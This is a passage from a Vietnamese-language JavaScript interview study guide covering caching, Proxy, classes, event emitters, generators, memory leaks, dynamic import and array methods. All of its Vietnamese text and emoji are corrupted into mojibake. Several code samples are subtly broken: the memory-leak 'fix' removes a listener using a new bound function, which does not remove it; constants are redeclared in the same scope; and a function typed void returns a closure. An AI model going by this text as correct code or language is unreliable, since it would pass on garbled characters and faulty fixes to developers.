â”‚  â””â”€âœ… IndexedDB + Stale While Revalidate                        â”‚
â”‚                                                                  â”‚
â”‚  ğŸ“± Offline Support?                                             â”‚
â”‚  â””â”€âœ… Service Worker + Cache First                              â”‚
â”‚     (vá»›i Network First cho HTML)                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âœ… Tá»•ng Káº¿t:**

- **HTTP Caching**: Server-side cache headers (Cache-Control, ETag, Last-Modified)
- **Browser Cache**: Automatic caching based on headers
- **Service Worker**: Advanced caching strategies (Cache First, Network First, SWR)
- **LocalStorage**: Simple client-side caching (< 5MB)
- **IndexedDB**: Large data caching (async, scalable)
- **Cache Invalidation**: Version-based, time-based, pattern-based, tag-based
- **Modern Approach**: React Query, SWR for automatic cache management

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸª Q27: JavaScript Proxy</span></summary>


**âš¡ Quick Summary:**
> Proxy = intercept object operations (get, set, delete...). Reflect = default behaviors

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ­ **Proxy**: Wrap object, intercept má»i operation
- ğŸ” **Use Cases**: Validation, logging, reactive data (Vue 3)
- âš¡ **Traps**: get, set, has, deleteProperty, apply, construct...

**Tráº£ lá»i:**

- **Proxy**: Object Ä‘á»ƒ intercept vÃ  customize operations
- **Hoáº¡t Ä‘á»™ng**: Wrap target object vÃ  intercept property access
- **Æ¯u Ä‘iá»ƒm**: Powerful metaprogramming, validation, logging
- **NhÆ°á»£c Ä‘iá»ƒm**: Performance overhead, complexity

**Code Example:**

```typescript
// Basic proxy
const target = { name: 'John', age: 25 };
const proxy = new Proxy(target, {
  get(target, property) {
    console.log(`Getting ${String(property)}`);
    return target[property as keyof typeof target];
  },
  set(target, property, value) {
    console.log(`Setting ${String(property)} to ${value}`);
    target[property as keyof typeof target] = value;
    return true;
  },
});

console.log(proxy.name); // Getting name, John
proxy.age = 26; // Setting age to 26

// Validation proxy
const userProxy = new Proxy(
  {},
  {
    set(target, property, value) {
      if (property === 'age' && (typeof value !== 'number' || value < 0)) {
        throw new Error('Age must be a positive number');
      }
      if (property === 'name' && typeof value !== 'string') {
        throw new Error('Name must be a string');
      }
      target[property as keyof typeof target] = value;
      return true;
    },
  }
);

userProxy.name = 'John'; // OK
userProxy.age = 25; // OK
// userProxy.age = -5; // Error: Age must be a positive number

// Logging proxy
const loggingProxy = new Proxy(
  {},
  {
    get(target, property) {
      console.log(`Accessing property: ${String(property)}`);
      return target[property as keyof typeof target];
    },
    set(target, property, value) {
      console.log(`Setting property: ${String(property)} = ${value}`);
      target[property as keyof typeof target] = value;
      return true;
    },
  }
);
```

**Best Practices:**

- Sá»­ dá»¥ng proxy cho validation
- Sá»­ dá»¥ng proxy cho logging
- Sá»­ dá»¥ng proxy cho metaprogramming
- Sá»­ dá»¥ng proper error handling

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ›ï¸ Q28: JavaScript Classes</span></summary>


**âš¡ Quick Summary:**
> ES6 Classes = syntactic sugar over prototypes. constructor, methods, static, inheritance

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ—ï¸ **Class**: `class Name { constructor() {} method() {} }`
- ğŸ”— **Extends**: `class Child extends Parent { super() }`
- ğŸ“Œ **Static**: Class-level methods, khÃ´ng cáº§n instance

**Tráº£ lá»i:**

- **Classes**: Syntactic sugar cho constructor functions
- **Hoáº¡t Ä‘á»™ng**: Táº¡o objects vá»›i methods vÃ  properties
- **Æ¯u Ä‘iá»ƒm**: Cleaner syntax, inheritance, encapsulation
- **NhÆ°á»£c Ä‘iá»ƒm**: CÃ³ thá»ƒ gÃ¢y confusion vá»›i this binding

**Code Example:**

```typescript
// Basic class
class Person {
  name: string;
  age: number;

  constructor(name: string, age: number) {
    this.name = name;
    this.age = age;
  }

  greet(): string {
    return `Hello, I'm ${this.name}`;
  }

  getAge(): number {
    return this.age;
  }
}

const person = new Person('John', 25);
console.log(person.greet()); // "Hello, I'm John"

// Inheritance
class Student extends Person {
  grade: string;

  constructor(name: string, age: number, grade: string) {
    super(name, age);
    this.grade = grade;
  }

  study(): string {
    return `${this.name} is studying`;
  }

  greet(): string {
    return `Hello, I'm ${this.name} and I'm a student`;
  }
}

const student = new Student('Jane', 20, 'A');
console.log(student.greet()); // "Hello, I'm Jane and I'm a student"

// Static methods
class MathUtils {
  static add(a: number, b: number): number {
    return a + b;
  }

  static multiply(a: number, b: number): number {
    return a * b;
  }
}

console.log(MathUtils.add(5, 3)); // 8

// Getters and setters
class Circle {
  private _radius: number;

  constructor(radius: number) {
    this._radius = radius;
  }

  get radius(): number {
    return this._radius;
  }

  set radius(value: number) {
    if (value < 0) {
      throw new Error('Radius cannot be negative');
    }
    this._radius = value;
  }

  get area(): number {
    return Math.PI * this._radius * this._radius;
  }
}

const circle = new Circle(5);
console.log(circle.area); // 78.54
circle.radius = 10;
console.log(circle.area); // 314.16
```

**Best Practices:**

- Sá»­ dá»¥ng classes cho object-oriented programming
- Sá»­ dá»¥ng inheritance khi cáº§n
- Sá»­ dá»¥ng static methods cho utility functions
- Sá»­ dá»¥ng getters/setters cho data validation

</details>

## **Pháº§n 10: Advanced Functional Programming**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ“¡ Q29: EventEmitter & Observer Pattern</span></summary>


**âš¡ Quick Summary:**
> EventEmitter = publish/subscribe pattern. on() subscribe, emit() publish, off() unsubscribe

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ“¡ **Pattern**: Publisher/Subscriber, decoupled communication
- ğŸ¯ **Methods**: on/once/off/emit
- âš ï¸ **Memory**: Remember off() Ä‘á»ƒ trÃ¡nh memory leak!

**Tráº£ lá»i:**

- **EventEmitter**: Pattern Ä‘á»ƒ emit vÃ  listen events
- **Observer Pattern**: Design pattern cho one-to-many dependency
- **Pub/Sub**: Publisher-Subscriber pattern cho loose coupling
- **Æ¯u Ä‘iá»ƒm**: Decoupled components, flexible communication
- **NhÆ°á»£c Ä‘iá»ƒm**: CÃ³ thá»ƒ gÃ¢y memory leaks, hard to debug

**Code Example:**

```typescript
// Custom EventEmitter
class EventEmitter {
  private events: Map<string, Function[]> = new Map();

  on(event: string, listener: Function): void {
    if (!this.events.has(event)) {
      this.events.set(event, []);
    }
    this.events.get(event)!.push(listener);
  }

  off(event: string, listener: Function): void {
    const listeners = this.events.get(event);
    if (listeners) {
      const index = listeners.indexOf(listener);
      if (index > -1) {
        listeners.splice(index, 1);
      }
    }
  }

  emit(event: string, ...args: any[]): void {
    const listeners = this.events.get(event);
    if (listeners) {
      listeners.forEach((listener) => listener(...args));
    }
  }

  once(event: string, listener: Function): void {
    const onceWrapper = (...args: any[]) => {
      listener(...args);
      this.off(event, onceWrapper);
    };
    this.on(event, onceWrapper);
  }
}

// Usage
const emitter = new EventEmitter();

// Subscribe to events
emitter.on('user:login', (user: any) => {
  console.log('User logged in:', user.name);
});

emitter.on('user:logout', (user: any) => {
  console.log('User logged out:', user.name);
});

// Emit events
emitter.emit('user:login', { name: 'John', id: 1 });
emitter.emit('user:logout', { name: 'John', id: 1 });

// Observer Pattern
interface Observer {
  update(data: any): void;
}

class Subject {
  private observers: Observer[] = [];
  private state: any;

  addObserver(observer: Observer): void {
    this.observers.push(observer);
  }

  removeObserver(observer: Observer): void {
    const index = this.observers.indexOf(observer);
    if (index > -1) {
      this.observers.splice(index, 1);
    }
  }

  notifyObservers(): void {
    this.observers.forEach((observer) => observer.update(this.state));
  }

  setState(newState: any): void {
    this.state = newState;
    this.notifyObservers();
  }
}

// Concrete Observer
class UserNotificationObserver implements Observer {
  update(data: any): void {
    console.log('Notification: User state changed to', data);
  }
}

// Usage
const subject = new Subject();
const notificationObserver = new UserNotificationObserver();

subject.addObserver(notificationObserver);
subject.setState('logged_in');

// Pub/Sub Pattern
class PubSub {
  private subscribers: Map<string, Function[]> = new Map();

  subscribe(topic: string, callback: Function): () => void {
    if (!this.subscribers.has(topic)) {
      this.subscribers.set(topic, []);
    }
    this.subscribers.get(topic)!.push(callback);

    // Return unsubscribe function
    return () => {
      const callbacks = this.subscribers.get(topic);
      if (callbacks) {
        const index = callbacks.indexOf(callback);
        if (index > -1) {
          callbacks.splice(index, 1);
        }
      }
    };
  }

  publish(topic: string, data: any): void {
    const callbacks = this.subscribers.get(topic);
    if (callbacks) {
      callbacks.forEach((callback) => callback(data));
    }
  }
}

// Usage
const pubsub = new PubSub();

const unsubscribe = pubsub.subscribe('user:update', (user: any) => {
  console.log('User updated:', user);
});

pubsub.publish('user:update', { name: 'John', age: 30 });

// Cleanup
unsubscribe();
```

**Best Practices:**

- Sá»­ dá»¥ng EventEmitter cho component communication
- Sá»­ dá»¥ng Observer pattern cho state management
- Sá»­ dá»¥ng Pub/Sub cho loose coupling
- Cleanup listeners Ä‘á»ƒ trÃ¡nh memory leaks

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng cleanup listeners
emitter.on('event', handler);
// Memory leak náº¿u khÃ´ng remove listener

// âœ… ÄÃºng: Cleanup listeners
const cleanup = () => emitter.off('event', handler);
// Call cleanup when component unmounts
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”„ Q30: Generator Functions & Async Generators</span></summary>


**âš¡ Quick Summary:**
> Generator = function* vá»›i yield. Pause/resume execution. Async generator = for await...of

**ğŸ’¡ Ghi Nhá»›:**
- â¸ï¸ **function***: Generator function vá»›i yield
- â–¶ï¸ **next()**: Resume execution, return {value, done}
- ğŸ”„ **Async Gen**: async function* vá»›i for await...of

**Tráº£ lá»i:**

- **Generator Functions**: Functions cÃ³ thá»ƒ pause vÃ  resume execution
- **yield**: Keyword Ä‘á»ƒ pause function vÃ  return value
- **yield\***: Delegate to another generator
- **Async Generators**: Generators vá»›i async/await support
- **Æ¯u Ä‘iá»ƒm**: Memory efficient, lazy evaluation, complex iteration
- **NhÆ°á»£c Ä‘iá»ƒm**: Complex syntax, not widely used

**Code Example:**

```typescript
// Basic Generator Function
function* numberGenerator(): Generator<number, void, unknown> {
  yield 1;
  yield 2;
  yield 3;
  return 4; // Final value
}

const gen = numberGenerator();
console.log(gen.next()); // { value: 1, done: false }
console.log(gen.next()); // { value: 2, done: false }
console.log(gen.next()); // { value: 3, done: false }
console.log(gen.next()); // { value: 4, done: true }

// Generator vá»›i parameters
function* counter(
  start: number,
  end: number
): Generator<number, void, unknown> {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}

const counterGen = counter(1, 5);
for (const value of counterGen) {
  console.log(value); // 1, 2, 3, 4, 5
}

// yield* - Delegate to another generator
function* generator1(): Generator<number, void, unknown> {
  yield 1;
  yield 2;
}

function* generator2(): Generator<number, void, unknown> {
  yield 3;
  yield 4;
}

function* combinedGenerator(): Generator<number, void, unknown> {
  yield* generator1();
  yield* generator2();
  yield 5;
}

const combined = combinedGenerator();
console.log([...combined]); // [1, 2, 3, 4, 5]

// Generator vá»›i input values
function* inputGenerator(): Generator<number, void, number> {
  let value = yield 1;
  console.log('Received:', value);
  value = yield 2;
  console.log('Received:', value);
  return value;
}

const inputGen = inputGenerator();
console.log(inputGen.next()); // { value: 1, done: false }
console.log(inputGen.next(10)); // Received: 10, { value: 2, done: false }
console.log(inputGen.next(20)); // Received: 20, { value: 20, done: true }

// Async Generator
async function* asyncNumberGenerator(): AsyncGenerator<number, void, unknown> {
  yield 1;
  await new Promise((resolve) => setTimeout(resolve, 1000));
  yield 2;
  await new Promise((resolve) => setTimeout(resolve, 1000));
  yield 3;
}

async function consumeAsyncGenerator(): Promise<void> {
  for await (const value of asyncNumberGenerator()) {
    console.log('Async value:', value);
  }
}

consumeAsyncGenerator(); // Logs: Async value: 1, then 2, then 3

// Practical example: Data streaming
async function* dataStream(): AsyncGenerator<string, void, unknown> {
  const data = ['chunk1', 'chunk2', 'chunk3'];
  for (const chunk of data) {
    await new Promise((resolve) => setTimeout(resolve, 500));
    yield chunk;
  }
}

async function processStream(): Promise<void> {
  for await (const chunk of dataStream()) {
    console.log('Processing chunk:', chunk);
  }
}

processStream();

// Generator for infinite sequences
function* fibonacci(): Generator<number, void, unknown> {
  let a = 0,
    b = 1;
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();
console.log(fib.next().value); // 0
console.log(fib.next().value); // 1
console.log(fib.next().value); // 1
console.log(fib.next().value); // 2
console.log(fib.next().value); // 3
```

**Best Practices:**

- Sá»­ dá»¥ng generators cho lazy evaluation
- Sá»­ dá»¥ng async generators cho data streaming
- Sá»­ dá»¥ng yield\* cho generator composition
- Sá»­ dá»¥ng for...of vá»›i generators

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng hiá»ƒu generator state
const gen = numberGenerator();
console.log(gen.next()); // { value: 1, done: false }
console.log(gen.next()); // { value: 2, done: false }
// Generator state is maintained

// âœ… ÄÃºng: Hiá»ƒu generator state
const gen = numberGenerator();
const values = [...gen]; // [1, 2, 3]
// Generator is exhausted after iteration
```

</details>

## **Pháº§n 12: Memory Management & Performance**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ§¹ Q31: Memory Management & Garbage Collection</span></summary>


**Tráº£ lá»i:**

- **Memory Management**: JavaScript tá»± Ä‘á»™ng quáº£n lÃ½ memory thÃ´ng qua Garbage Collection
- **Garbage Collection**: Process tá»± Ä‘á»™ng free memory khÃ´ng cÃ²n Ä‘Æ°á»£c sá»­ dá»¥ng
- **Mark and Sweep**: Algorithm chÃ­nh Ä‘á»ƒ detect vÃ  collect garbage
- **Æ¯u Ä‘iá»ƒm**: Automatic memory management, developer khÃ´ng cáº§n manual free
- **NhÆ°á»£c Ä‘iá»ƒm**: CÃ³ thá»ƒ gÃ¢y performance issues, unpredictable timing

**Code Example:**

```typescript
// Memory allocation
function createLargeObject(): object {
  return {
    data: new Array(1000000).fill('large data'),
    timestamp: Date.now(),
  };
}

// Object lifecycle
let largeObject = createLargeObject();
console.log('Object created');

// Object becomes eligible for GC when no references
largeObject = null;
console.log('Object reference removed');

// Garbage Collection triggers
function triggerGC(): void {
  // Force garbage collection (if available)
  if (window.gc) {
    window.gc();
  }
}

// Memory monitoring
function monitorMemory(): void {
  if ('memory' in performance) {
    const memory = (performance as any).memory;
    console.log('Used:', memory.usedJSHeapSize / 1024 / 1024, 'MB');
    console.log('Total:', memory.totalJSHeapSize / 1024 / 1024, 'MB');
    console.log('Limit:', memory.jsHeapSizeLimit / 1024 / 1024, 'MB');
  }
}

// Weak references (don't prevent GC)
const weakMap = new WeakMap();
const weakSet = new WeakSet();

function useWeakReferences(): void {
  const obj = { data: 'important' };

  // These don't prevent garbage collection
  weakMap.set(obj, 'metadata');
  weakSet.add(obj);

  // obj can be garbage collected even with weak references
  // weakMap and weakSet will automatically remove the entries
}

// Memory leaks examples
function createMemoryLeak(): void {
  const elements: HTMLElement[] = [];

  // Memory leak: keeping references to DOM elements
  for (let i = 0; i < 1000; i++) {
    const element = document.createElement('div');
    elements.push(element); // Keeps reference
  }

  // Elements won't be garbage collected
}

// Proper cleanup
function properCleanup(): void {
  const elements: HTMLElement[] = [];

  for (let i = 0; i < 1000; i++) {
    const element = document.createElement('div');
    elements.push(element);
  }

  // Cleanup: remove references
  elements.length = 0;
  // Now elements can be garbage collected
}

// Event listener cleanup
function addEventListenerWithCleanup(): () => void {
  const handler = (event: Event) => {
    console.log('Event:', event);
  };

  document.addEventListener('click', handler);

  // Return cleanup function
  return () => {
    document.removeEventListener('click', handler);
  };
}

const cleanup = addEventListenerWithCleanup();
// Later: cleanup(); // Remove event listener
```

**Best Practices:**

- Sá»­ dá»¥ng WeakMap/WeakSet cho temporary references
- Cleanup event listeners
- Remove DOM references khi khÃ´ng cáº§n
- Monitor memory usage
- Sá»­ dá»¥ng proper cleanup functions

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng cleanup event listeners
document.addEventListener('click', handler);
// Memory leak náº¿u khÃ´ng removeEventListener

// âœ… ÄÃºng: Cleanup event listeners
const cleanup = () => document.removeEventListener('click', handler);
cleanup(); // Remove listener
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸš¨ Q32: Memory Leaks Detection & Prevention</span></summary>


**Tráº£ lá»i:**

- **Memory Leaks**: Memory Ä‘Æ°á»£c allocate nhÆ°ng khÃ´ng Ä‘Æ°á»£c free
- **Common Causes**: Event listeners, DOM references, closures, timers
- **Detection**: Browser DevTools, memory profiling
- **Prevention**: Proper cleanup, weak references, monitoring
- **Æ¯u Ä‘iá»ƒm**: Better performance, stable applications
- **NhÆ°á»£c Ä‘iá»ƒm**: Cáº§n careful coding, monitoring overhead

**Code Example:**

```typescript
// Common memory leak patterns

// 1. Event listeners khÃ´ng Ä‘Æ°á»£c cleanup
class Component {
  private element: HTMLElement;

  constructor() {
    this.element = document.createElement('div');
    // Memory leak: khÃ´ng cleanup event listener
    this.element.addEventListener('click', this.handleClick.bind(this));
  }

  private handleClick(): void {
    console.log('Clicked');
  }

  // Fix: Add cleanup method
  destroy(): void {
    this.element.removeEventListener('click', this.handleClick.bind(this));
    this.element.remove();
  }
}

// 2. DOM references
function createMemoryLeak(): void {
  const elements: HTMLElement[] = [];

  for (let i = 0; i < 1000; i++) {
    const element = document.createElement('div');
    elements.push(element); // Keeps reference
  }

  // Fix: Clear references
  elements.length = 0;
}

// 3. Closures giá»¯ references
function createClosureLeak(): void {
  const largeData = new Array(1000000).fill('data');

  return function () {
    // Closure giá»¯ reference Ä‘áº¿n largeData
    console.log('Closure executed');
  };
}

// Fix: Clear references
function createProperClosure(): () => void {
  const largeData = new Array(1000000).fill('data');

  return function () {
    console.log('Closure executed');
    // Clear reference when done
    largeData.length = 0;
  };
}

// 4. Timers khÃ´ng Ä‘Æ°á»£c clear
function createTimerLeak(): void {
  const interval = setInterval(() => {
    console.log('Timer tick');
  }, 1000);

  // Memory leak: khÃ´ng clear interval
}

// Fix: Clear timers
function createProperTimer(): () => void {
  const interval = setInterval(() => {
    console.log('Timer tick');
  }, 1000);

  return () => clearInterval(interval);
}

// Memory leak detection
class MemoryLeakDetector {
  private static instances: Set<object> = new Set();

  static track(obj: object): void {
    this.instances.add(obj);
  }

  static untrack(obj: object): void {
    this.instances.delete(obj);
  }

  static getInstanceCount(): number {
    return this.instances.size;
  }
}

// Usage
class TrackedComponent {
  constructor() {
    MemoryLeakDetector.track(this);
  }

  destroy(): void {
    MemoryLeakDetector.untrack(this);
  }
}

// Memory profiling
function profileMemory(): void {
  if ('memory' in performance) {
    const memory = (performance as any).memory;
    const used = memory.usedJSHeapSize / 1024 / 1024;
    const total = memory.totalJSHeapSize / 1024 / 1024;

    console.log(`Memory usage: ${used.toFixed(2)}MB / ${total.toFixed(2)}MB`);

    // Alert if memory usage is high
    if (used > 100) {
      console.warn('High memory usage detected!');
    }
  }
}

// Weak references Ä‘á»ƒ trÃ¡nh memory leaks
class WeakReferenceManager {
  private weakMap = new WeakMap<object, any>();

  setReference(obj: object, data: any): void {
    this.weakMap.set(obj, data);
  }

  getReference(obj: object): any {
    return this.weakMap.get(obj);
  }

  // No need to cleanup - WeakMap automatically removes entries
}

// Proper cleanup pattern
class ResourceManager {
  private resources: Set<() => void> = new Set();

  addResource(cleanup: () => void): void {
    this.resources.add(cleanup);
  }

  cleanup(): void {
    this.resources.forEach((cleanup) => cleanup());
    this.resources.clear();
  }
}

// Usage
const manager = new ResourceManager();

// Add event listener
const cleanup1 = addEventListenerWithCleanup();
manager.addResource(cleanup1);

// Add timer
const cleanup2 = createProperTimer();
manager.addResource(cleanup2);

// Later: manager.cleanup(); // Cleanup all resources
```

**Best Practices:**

- Sá»­ dá»¥ng WeakMap/WeakSet cho temporary references
- Cleanup event listeners vÃ  timers
- Remove DOM references
- Sá»­ dá»¥ng resource managers
- Monitor memory usage
- Sá»­ dá»¥ng proper cleanup patterns

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng cleanup resources
const interval = setInterval(() => {}, 1000);
// Memory leak

// âœ… ÄÃºng: Cleanup resources
const interval = setInterval(() => {}, 1000);
clearInterval(interval); // Cleanup
```

</details>

## **Pháº§n 13: Module System & Advanced Object Concepts**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ“¥ Q33: Dynamic Import & Module System</span></summary>


**Tráº£ lá»i:**

- **Dynamic Import**: Import modules at runtime thay vÃ¬ compile time
- **Module System**: ES6 modules, CommonJS, AMD
- **Hoáº¡t Ä‘á»™ng**: Dynamic import tráº£ vá» Promise, cho phÃ©p lazy loading
- **Æ¯u Ä‘iá»ƒm**: Code splitting, lazy loading, better performance
- **NhÆ°á»£c Ä‘iá»ƒm**: Complexity, async handling required

**Code Example:**

```typescript
// Static import (compile time)
import { utils } from './utils';
import React from 'react';

// Dynamic import (runtime)
async function loadModule(): Promise<void> {
  try {
    // Dynamic import tráº£ vá» Promise
    const module = await import('./heavy-module');
    const result = module.default();
    console.log('Module loaded:', result);
  } catch (error) {
    console.error('Failed to load module:', error);
  }
}

// Conditional loading
async function loadModuleConditionally(condition: boolean): Promise<void> {
  if (condition) {
    const { heavyFunction } = await import('./heavy-module');
    heavyFunction();
  }
}

// Lazy loading components
async function loadComponent(): Promise<React.ComponentType> {
  const module = await import('./LazyComponent');
  return module.default;
}

// Code splitting vá»›i dynamic import
function createRouteLoader(routeName: string) {
  return async () => {
    switch (routeName) {
      case 'home':
        return await import('./routes/Home');
      case 'about':
        return await import('./routes/About');
      case 'contact':
        return await import('./routes/Contact');
      default:
        throw new Error(`Unknown route: ${routeName}`);
    }
  };
}

// Usage
const homeLoader = createRouteLoader('home');
const HomeComponent = await homeLoader();

// Dynamic import vá»›i error handling
async function safeImport(modulePath: string): Promise<any> {
  try {
    const module = await import(modulePath);
    return module;
  } catch (error) {
    console.error(`Failed to import ${modulePath}:`, error);
    return null;
  }
}

// Lazy loading vá»›i React
const LazyComponent = React.lazy(() => import('./LazyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <LazyComponent />
    </Suspense>
  );
}

// Module system comparison
// ES6 Modules
export const name = 'John';
export default function greet() {}

// CommonJS
module.exports = {
  name: 'John',
  greet: function () {},
};

// AMD
define(['dependency'], function (dependency) {
  return {
    name: 'John',
    greet: function () {},
  };
});

// Dynamic import vá»›i multiple modules
async function loadMultipleModules(): Promise<void> {
  const [module1, module2, module3] = await Promise.all([
    import('./module1'),
    import('./module2'),
    import('./module3'),
  ]);

  console.log('All modules loaded');
}

// Khi nÃ o nÃªn dÃ¹ng dynamic import
function shouldUseDynamicImport(): boolean {
  // 1. Large modules khÃ´ng cáº§n ngay
  // 2. Conditional loading
  // 3. Code splitting
  // 4. Lazy loading
  return true;
}
```

**Best Practices:**

- Sá»­ dá»¥ng dynamic import cho large modules
- Sá»­ dá»¥ng cho conditional loading
- Sá»­ dá»¥ng cho code splitting
- Sá»­ dá»¥ng proper error handling
- Sá»­ dá»¥ng vá»›i React.lazy cho components

**Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng handle errors
const module = await import('./module');
// CÃ³ thá»ƒ throw error

// âœ… ÄÃºng: Handle errors
try {
  const module = await import('./module');
} catch (error) {
  console.error('Import failed:', error);
}
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ› ï¸ Q34: Advanced Array & Object Methods, Object Concepts & Immutability</span></summary>


**Tráº£ lá»i:**

**Part 1: Advanced Array & Object Methods**
- **Advanced Array Methods**: flat, flatMap, from, of, entries, values, keys
- **Advanced Object Methods**: Object.assign, Object.entries, Object.values, Object.keys

**Part 2: Advanced Object Concepts**
- **Object.create()**: Táº¡o object vá»›i specific prototype
- **Prototype Chain**: Mechanism cho inheritance
- **Mixin Pattern**: Share functionality between objects
- **Object.freeze/seal/preventExtensions**: Control object mutability
- **Property Descriptors**: Fine-grained property control

**Æ¯u Ä‘iá»ƒm**: Powerful manipulation, flexible inheritance, immutability control
**NhÆ°á»£c Ä‘iá»ƒm**: Complex prototype chain, browser compatibility, learning curve

**Code Example:**

```typescript
// Array.flat() - Flatten nested arrays
const nestedArray = [1, [2, 3], [4, [5, 6]]];
const flattened = nestedArray.flat(); // [1, 2, 3, 4, [5, 6]]
const deeplyFlattened = nestedArray.flat(2); // [1, 2, 3, 4, 5, 6]

// Array.flatMap() - Map vÃ  flatten
const numbers = [1, 2, 3, 4];
const doubled = numbers.flatMap((n) => [n, n * 2]); // [1, 2, 2, 4, 3, 6, 4, 8]

// Array.from() - Create array from iterable
const arrayFromString = Array.from('hello'); // ['h', 'e', 'l', 'l', 'o']
const arrayFromSet = Array.from(new Set([1, 2, 2, 3])); // [1, 2, 3]
const arrayWithMapping = Array.from({ length: 5 }, (_, i) => i * 2); // [0, 2, 4, 6, 8]

// Array.of() - Create array from arguments
const arrayOf = Array.of(1, 2, 3, 4); // [1, 2, 3, 4]
const arrayOfSingle = Array.of(7); // [7]

// Array.entries() - Get index-value pairs
const fruits = ['apple', 'banana', 'orange'];
for (const [index, fruit] of fruits.entries()) {
  console.log(`${index}: ${fruit}`);
}

// Array.values() - Get values
const values = fruits.values();
for (const value of values) {
  console.log(value);
}

// Array.keys() - Get indices
const keys = fruits.keys();
for (const key of keys) {
  console.log(key);
}

// Object.assign() - Copy properties
const target = { a: 1, b: 2 };
const source = { b: 3, c: 4 };
const result = Object.assign(target, source); // { a: 1, b: 3, c: 4 }

// Object.entries() - Get key-value pairs
const person = { name: 'John', age: 30, city: 'HCM' };
const entries = Object.entries(person); // [['name', 'John'], ['age', 30], ['city', 'HCM']]

// Object.values() - Get values
const values = Object.values(person); // ['John', 30, 'HCM']

// Object.keys() - Get keys
const keys = Object.keys(person); // ['name', 'age', 'city']

// Practical examples
function processUserData(users: any[]): any[] {
  return users
    .flatMap((user) => user.hobbies || []) // Flatten hobbies
    .filter((hobby) => hobby.length > 3) // Filter long hobbies
    .map((hobby) => hobby.toUpperCase()); // Transform
}

function createLookupTable(objects: any[]): Map<string, any> {
  return new Map(
    objects.flatMap((obj) =>
      Object.entries(obj).map(([key, value]) => [key, obj])
    )
  );
}

function mergeObjects(...objects: any[]): any {
  return objects.reduce((acc, obj) => Object.assign(acc, obj), {});
}

function getObjectStats(obj: any): {
  keys: number;
  values: any[];
  entries: [string, any][];
} {
  return {
    keys: Object.keys(obj).length,
    values: Object.values(obj),
    entries: Object.entries(obj),
  };
}

// Advanced usage
function transformData(data: any[]): any[] {
  return data
    .flatMap((item) => item.items || []) // Flatten nested items
    .map((item) => ({
      ...item,
      processed: true,
      timestamp: Date.now(),
    }))
    .filter((item) => item.active);
}

function createIndexMap(data: any[]): Map<string, any[]> {
  const indexMap = new Map();

  data.forEach((item) => {
    Object.entries(item).forEach(([key, value]) => {
      if (!indexMap.has(key)) {
        indexMap.set(key, []);
      }
      indexMap.get(key).push(value);
    });
  });

  return indexMap;
}
```

**Best Practices:**

- Sá»­ dá»¥ng flat() cho nested arrays
- Sá»­ dá»¥ng flatMap() cho map vÃ  flatten
- Sá»­ dá»¥ng Object.entries() cho iteration
- Sá»­ dá»¥ng Object.assign() cho object merging
- Sá»­ dá»¥ng Array.from() cho array creation

**Mistakes - Array Methods:**

```typescript
// âŒ Sai: KhÃ´ng hiá»ƒu flat depth
const nested = [1, [2, [3, [4]]]];
const flattened = nested.flat(); // [1, 2, [3, [4]]] - only 1 level

// âœ… ÄÃºng: Specify depth
const deeplyFlattened = nested.flat(Infinity); // [1, 2, 3, 4]
```

**Part 2: Advanced Object Concepts - Prototype, Inheritance & Immutability**

**Code Example - Object.create() & Prototype Chain:**

```typescript
// Object.create() - Create object with specific prototype
const personPrototype = {
  greet(): string {
    return `Hello, I'm ${this.name}`;
  },
  getAge(): number {
    return this.age;
  },
};

const person = Object.create(personPrototype);
person.name = 'John';
person.age = 30;

console.log(person.greet()); // "Hello, I'm John"
console.log(person.getAge()); // 30

// Prototype chain
function Person(name: string, age: number) {
  this.name = name;
  this.age = age;
}

Person.prototype.greet = function (): string {
  return `Hello, I'm ${this.name}`;
};

function Student(name: string, age: number, grade: string) {
  Person.call(this, name, age);
  this.grade = grade;
}

// Set up inheritance
Student.prototype = Object.create(Person.prototype);
Student.prototype.constructor = Student;

Student.prototype.study = function (): string {
  return `${this.name} is studying`;
};

const student = new Student('Jane', 20, 'A');
console.log(student.greet()); // "Hello, I'm Jane"
console.log(student.study()); // "Jane is studying"

// Mixin pattern
const canFly = {
  fly(): string {
    return `${this.name} is flying`;
  },
};

const canSwim = {
  swim(): string {
    return `${this.name} is swimming`;
  },
};

function mixin(target: any, ...sources: any[]): any {
  sources.forEach((source) => {
    Object.getOwnPropertyNames(source).forEach((name) => {
      if (name !== 'constructor') {
        target[name] = source[name];
      }
    });
  });
  return target;
}

function Bird(name: string) {
  this.name = name;
}

mixin(Bird.prototype, canFly);

const bird = new Bird('Eagle');
console.log(bird.fly()); // "Eagle is flying"

// Object.freeze() - Make object immutable
const frozenObject = Object.freeze({
  name: 'John',
  age: 30,
  address: {
    city: 'HCM',
  },
});

// frozenObject.name = 'Jane'; // Error in strict mode
// frozenObject.address.city = 'HN'; // Still works (shallow freeze)

// Deep freeze function
function deepFreeze(obj: any): any {
  Object.getOwnPropertyNames(obj).forEach((prop) => {
    if (obj[prop] !== null && typeof obj[prop] === 'object') {
      deepFreeze(obj[prop]);
    }
  });
  return Object.freeze(obj);
}

const deeplyFrozen = deepFreeze({
  name: 'John',
  address: {
